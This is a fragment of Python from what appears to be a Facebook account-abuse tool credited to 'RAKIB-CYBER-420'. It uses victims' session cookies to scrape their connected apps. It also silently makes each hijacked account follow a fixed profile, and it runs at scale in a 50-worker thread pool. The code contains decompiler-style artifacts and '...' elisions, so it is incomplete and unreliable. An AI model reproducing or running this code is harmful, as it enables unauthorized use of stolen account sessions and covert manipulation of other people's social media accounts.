...
def cek_apk(session,coki):
    w=session.get("https://facebook.com/profile.php/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    ...
    w=session.get("https://facebook.com/profile.php/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://facebook.com/profile.php?id=100080123630781', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://facebook.com/profile.php' + str(get), {
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96mRAKIB-CYBER-420 ')
